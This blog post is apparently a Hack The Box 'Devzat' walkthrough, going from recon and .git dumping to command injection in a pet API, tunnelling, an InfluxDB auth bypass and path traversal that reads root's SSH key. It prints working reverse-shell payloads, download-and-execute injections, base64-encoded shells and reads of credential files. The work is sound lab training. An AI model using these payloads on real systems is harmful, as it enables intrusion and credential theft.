---
layout: post
title:  "Devzat Writeup - Hack The Box"
date:   2023-12-25
desc: "Web Injection, GIT Directory Fuzzing, InfluxDB Injection, Devzat Chat Abusing"
keywords: "HTB,eJPT,eWPT,Linux,WebInjection,GIT,InfluxDB,DevzatChat,Medium"
categories: [HTB]
tags: [HTB,eJPT,eWPT,Linux,WebInjection,GITProjectRecomposition,InfluxDB,DevzatChat,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

All the machines I have been making so far have been challenging and really entertaining, but this machine was a real challenge, because without the help and collaboration of the community it would have taken me a long time to solve it alone. I have learned a lot, but the most important thing I keep in mind is that as a pentester I must write down everything, because what seems meaningless at the beginning, at some point in the exploitation can become my attack vector. The **Devzat** box from [Hack The Box](https://www.hackthebox.com/){:target="_blank"} is still classified as **Medium** and I think, for everything that must be used, it is very good in its valuation.

<br/><br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat.jpg" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I am going to deploy the **Devzat** box from **Hack The Box** using the **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** script and start my **Writeup**. With `nmap` I find three open ports, I also get the services and versions thanks to their recon scripts. I can also find with some search engine the **Codename** of the machine, **Focal** and I also see the domain of the web service, which I add immediately to my hosts list, so that the system can resolve correctly, when accessing from the terminal or from the browser.

```bash
./htbExplorer -d Devzat
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.118 -oG allPorts
nmap -sCV -p22,80,8000 10.10.11.118 -oN targeted
cat targeted
# google.es --> OpenSSH 8.2p1 4ubuntu0.2 launchpad --> focal
# google.es --> Apache httpd 2.4.41 launchpad --> focal
#  Did not follow redirect to http://devzat.htb/

nvim /etc/hosts
```
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I filter for those services that use **HTTP** protocol and then list their technologies with whatweb, I don't find much, but the service response on port **8000** cannot be correctly interpreted, it seems that it is a service that cannot be accessed from the web. If I access with a browser to the two ports, on port **80** they tell me how to access the service on port **8000** with **SSH**, but as much as I try I can not from my machine, even trying with a `bash` shell and not from the `zsh`.

```bash
cat targeted | grep http

whatweb http://10.10.11.118 http://10.10.11.118
# Redirect!! devzat.htb
# --> Email[patrick@devzat.htb]

# HTTPBadResponse

ssh patrick@devzat.htb -p 8000
ssh -l patrick@devzat.htb devzat.htb -p 8000
ssh -l patrick devzat.htb -p 8000
ssh -l oldboy devzat.htb -p 8000
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

After a long time searching for a solution to the **"no matching host key type found. their offer ssh-rsa ssh-dss"** problem, I find an article, **[[SOLVED] no matching host key type found. Their offer: ssh-rsa,ssh-dss](https://www.linuxquestions.org/questions/linux-security-4/no-matching-host-key-type-found-their-offer-ssh-rsa-ssh-dss-4175701155/){:target="_blank"}**, that works to connect via **SSH** to the service on port **8000**, which happens to be a **Chat**. The **Bot** helps me with the commands, but I can't find one that allows me to do something malicious to leak information or get an **RCE**. In the example code, a function is shown **`fmt.println`**, and if I search for it on the Internet, I find out that it belongs to the **Go** programming language (**[fmt](https://pkg.go.dev/fmt){:target="_blank"}**), this information can be useful for later.

```bash
nvim /etc/ssh/ssh_config
# Add:
# HostKeyAlgorithms +ssh-rsa,ssh-dss

ssh -l patrick devzat.htb -p 8000
  > /help
  > /commands
  > /users
  > /example-code
  > $whoami
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I use `wfuzz` to find a directory or file using the URL and port 80, I don't find anything important, but if I search for **subdomains**, there is one, **pets**. I access with the browser and the web service seems to perform the task of keeping an inventory of pets, where I can also add one.

```bash
wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://devzat.htb/FUZZ

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H 'Host: FUZZ.devzat.htb' http://10.10.11.118
wfuzz -c --hc=404 -L -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H 'Host: FUZZ.devzat.htb' http://10.10.11.11817
wfuzz -c --hc=404 -L --hh=6527 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H 'Host: FUZZ.devzat.htb' http://10.10.11.118

nvim /etc/hosts
cat !$
ping -c 1 pets.devzat.htb
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try some injections (**HTML**, **JavaScript**) but none of them work. What does seem intriguing is the response of the server: **exit status 1**.

```html
<marquee>Oldboy</marquee>
<script>alert('XSS');</script>
<h2>oldboy</h2>
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am going to use **BurpSuite** to capture the traffic to the web server, to see if any attacks can be performed or find any misconfiguration. When I see the content of the packet sent, I am struck by the amount of parameters used, it seems to me that some are missing, but I will use the **Repeater** tool to analyze it better.

```bash
burpsuite &>/dev/null & disown
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

If I send the request with only one parameter, the pet can be added, I try injecting some command but it doesn't work. If I add one more parameter (**species**), it also works, and if I now try injecting a command, I get what I expected.

```java
{"name":"test"}
{"name":"test;whoami"}
{"name":"test","species":"Cat;whoami"}
```

```bash
tcpdump -i tun0 icmp -n
```

```java
{"name":"test","species":"Cat; ping -c 1 10.10.14.15"}
```

<br/><br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I try to get a **Reverse Shell**, using the **[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** commands, they do not work. Then I will create a malicious `index.html` file, with bash code to get it, I just have to create a local server with **Python** and then from the victim machine access my server and interpret the content with `bash`, I get access to the machine. I make a console treatment to be able to deploy me with greater comfort and I corroborate the **Codename**, which agrees with what I obtained with **Launchpad**. I also see that there is a network interface corresponding to Docker.

```bash
nc -nlvp 443
```

```java
{"Name":"oldb", "Species":"Cat;bash -i >&/dev/tcp/10.10.14.15/443 0>&1"}
```

```bash
nvim index.html
python3 -m http.server 80
nc -nlvp 443
```

> **index.html**

```bash
#!/bin/bash

bash -i >&/dev/tcp/10.10.14.15/443 0>&1
```

```java
{"Name":"oldb", "Species":"Cat;curl 10.10.14.15"}
{"Name":"oldb", "Species":"Cat;curl 10.10.14.15|bash"}
```

```bash
whoami
hostname -I
hostname

script /dev/null -c bash        [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

id
groups
uname -a
lsb_release -a
route -n
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

With the help of the **[Hack4u](https://hack4u.io/){:target="_blank"}** community, another way to access the victim machine can be found. If I search the internet for **"chat over ssh github"** I find the **[devzat](https://github.com/quackduck/devzat){:target="_blank"}** project on **Github** which seems to me to be implemented on the **Devzat** box. In the project I find help with the commands I can run in the chat, but it also makes me think that there must be a **Git** related directory on the server, so I can use `wfuzz` to search for it and I find it, with `wget` I download all the resources but I omit the **index** files, which I am not interested in at the moment. If I analyze the **logs**, I find a port that I had not found with `nmap`, the **5000**, plus a directory that may be an API. With `curl` I check if I can access it and so I did.

```bash
wfuzz -c --hc=404 --hh=510 -w /usr/share/SecLists/Discovery/Web-Content/common.txt http://pets.devzat.htb/FUZZ
wget -r http://pets.devzat.htb/.git
wget -r http://pets.devzat.htb/.git/ -R index\*

git log
git show ef07a04....

curl -s -X GET http://pets.devzat.htb/api/pet/
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I access the **API** from the browser and I don't see that it differs from the original web service. In **Git** you can return to a previous state with the `reset` parameter, and thus obtain other files that can serve me, and so it is, I find the `main.go` file that has a function that has a vulnerability, since it allows to inject a command. I capture with **BurpSuite** the request when I try to register a new pet and now I see the two parameters.

```bash
git --help
git reset --help
```

> **reset**: Reset current HEAD to the specified state

> **--hard**: Resets the index and working tree. Any changes to tracked files in the working tree since **commit** are discarded. Any untracked files or directories in the way of writing any tracked files are simply deleted.

```bash
git reset --hard
ls -a

cat main.go
# --> cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
# VULNERABILITY!!!! Sanitize!!!
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am trying to get an **RCE** directly from the console using `curl`, since the injection is similar to the one I did before but from **BurpSuite**. First I verify the connectivity with a `ping` and then I can get a **Reverse Shell**, this time using `base64` and `bash`. When I list the user's home file, I find a private **id_rsa** key, so I use it to connect again to the machine without entering the password and get a more stable terminal.

```bash
tcpdump -i tun0 icmp -n
curl -s -X POST http://pets.devzat.htb/api/pet -d '{"name":"test","species":"giraffe;ping -c 1 10.10.14.15"}'

cat index.html | base64 -w 0; echo
nc -nlvp 443

curl -s -X POST http://pets.devzat.htb/api/pet -d '{"name":"test","species":"giraffe;echo IyEvYmluL2Jhc2gKCmJhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC4xNS80NDMgMD4mMQo=|base64 -d|bash"}'

cat id_rsa

nvim id_rsa
chmod 600 id_rsa

ssh -i id_rsa patrick@10.10.11.118
export TERM=xterm
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_43.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_44.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_45.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

With this user I don't have enough privileges to read the first flag. But if I use some recon commands, I find some internal ports, only accessible from the host machine. I download and compile the latest version of **[chisel](https://github.com/jpillora/chisel){:target="_blank"}** but it does not work on the victim machine, this already happened to me on another machine, it is a version problem, I should try with an older one.

> **Victime Machine**:

```bash
grep "sh$" /etc/passwd
# patrick, catherine

find \-perm -4000 2>/dev/null
which pkexec | xargs ls -l
getcap -r / 2>/dev/null

netstat -nat
ps -faux
ps -fawx
# --> /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172.17.0.2 -conta
# --> port 8086
```

> **Attacker Machine**:

```bash
git clone https://github.com/jpillora/chisel.git
go build -ldflags "-s -w" .
du -hc chisel         # --> 8.1M
upx chisel
du -hc chisel         # --> 3.0M
python3 -m http.server 80
```

> **Victime Machine**:

```bash
cd /dev/shm
wget http://10.10.14.29/chisel
chmod +x chisel
./chisel            # :(
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_46.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_47.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_48.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_49.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_50.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I download **[chisel_1.7.6](https://github.com/jpillora/chisel/releases/tag/v1.7.6){:target="_blank"}** it works correctly on the victim machine. I create the necessary tunnels so that the internal ports that I found are accessible from my machine and with `nmap` I see the services and versions that I have to face. In one is running an **InfluxDB** and in the other, a service similar to the one on port **8000**.

> **InfluxDB** is an open-source time series database (TSDB) developed by the company InfluxData. It is written in the Go programming language for storage and retrieval of time series data in fields such as operations monitoring, application metrics, Internet of Things sensor data, and real-time analytics. It also has support for processing data from Graphite.

> **Attacker Machine**:

```bash
mv ~/Downloads/chisel_1.7.6_linux_amd64.gz chisel.gz
gunzip chisel.gz
python3 -m http.server 80

./chisel server -reverse -p 1234
```

> **Victime Machine**:

```bash
wget http://10.10.14.29/chisel
chmod +x chisel
./chisel

./chisel client 10.10.14.15:1234 R:5000:127.0.0.1:5000 R:8086:127.0.0.1:8086 R:8446:127.0.0.1:8446
```

> **Attacker Machine**:

```bash
lsof -i:5000
lsof -i:8086
lsof -i:8443

nmap -sCV -p5000,8086,8443 127.0.0.1
# --> 8086/tcp open  http       InfluxDB http admin 1.7.5
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_51.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_52.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_53.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_54.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I use `netcat` to try to connect to the different services, the only one that responds is port **8443**, whose response header shows me the same as the one for port **8000**. It is very likely that one is the **Production** project and the other is the **Development** project. If I access by **SSH** and see the available commands, one is now available that allows me to read files, but it asks me for a password.

```bash
nc 127.0.0.1 5000
nc localhost 5000
nc 127.0.0.1 8086
nc localhost 8086

nc 127.0.0.1 8443
# SSH-2.0-Go

nc 10.10.11.118 8000
# SSH-2.0-Go

ssh -l oldboy localhost -p 8443
  > /help
  > /commands
  > /file
  > /file /etc/passwd
# --> You need to provide the correct password to use this function
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_55.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_56.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I search for some exploit for **InfluxDB**, **"InfluxDB 1.7.5 exploit github"**, I find a repository that allows to bypass authentication, **[ InfluxDB-Exploit-CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933){:target="_blank"}**. I clone the repository and check that it is vulnerable and I can find the commands I need to enumerate the Database in **[8086 - Pentesting InfluxDB](https://book.hacktricks.xyz/network-services-pentesting/8086-pentesting-influxdb){:target="_blank"}**. After searching for a while, I find the credentials of the user **catherine**, which also appeared in the `passwd` file.

```bash
git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

python __main__.py
  > 1
  > show databases
  > show measurements
  > show field keys
  > select * from user
  > select * from 'user'
  > select * from  FROM "user"
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_57.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_58.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_59.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_60.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_61.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_62.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

The credential I found is useful to perform a **User Pivoting** and to be able to read the first flag. I list the system, but I can't find anything, it takes me a while to search for those files that the user `catherine` has read permissions, to find an interesting one, **devzat-dev.zip**. It is a compressed file and if I unzip it and list its files, I find the **`main.go`** and a credential encoded in it, which might be useful for the service exposed on port **8443**.

```bash
su catherine
sudo -l
id
groups
which pkexec | xargs ls -l

find \-type f -user catherine 2>/dev/null | grep -v -E "sys|proc"

cp /var/backups/devzat-dev.zip devzat-dev.zip
unzip devzat-dev.zip

cat commands.go
# --> if pass != "CeilingCatStillAThingIn2021?" {
#                 u.system("You did provide the wrong password")
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_63.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_64.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_65.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_66.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_67.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_68.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I create again a tunnel with **Chisel**, but this time only for port **8443**. I access the chat and try to read a file, the password I found allows me to do it without problems, I look for one that allows me to access as the user with higher privileges and I find the `id_rsa` of **root**, I create a key on my machine with the special permissions it needs and I can access and rooted the machine.

> **Attacker Machine**:

```bash
./chisel server -reverse -p 1234
```

> **Victime Machine**:

```bash
./chisel client 10.10.14.15:1234 R:8443:127.0.0.1:8443
```

> **Attacker Mahine**:

```bash
lsof -i:8443
ssh -l oldboy localhost -p 8443
  > /commands
  > /file /etc/passwd
  > /file ../../../etc/passwd
  > /file ../../../etc/shadow
  > /file ../../../root/.ssh/id_rsa

nvim id_rsa
chmod 600 id_rsa
ssh -i id_rsa_root root@10.10.11.118
```

<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_69.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_70.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_71.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_72.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_73.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_74.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/devzat_writeup/Devzat_75.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

> This box took me several hours of work and research, but with the help of the community, as well as the excellent resources available on the net (exploits, CVE, research) I was able to hack it. Every **Hack The Box** box always gives you a huge possibility to keep learning and expand your skills as a **Pentester**. I kill the box with **htbExplorer**, rest a bit and choose another lab to continue my path to personal and professional growth.

```bash
./htbExplorer -k Devzat
```
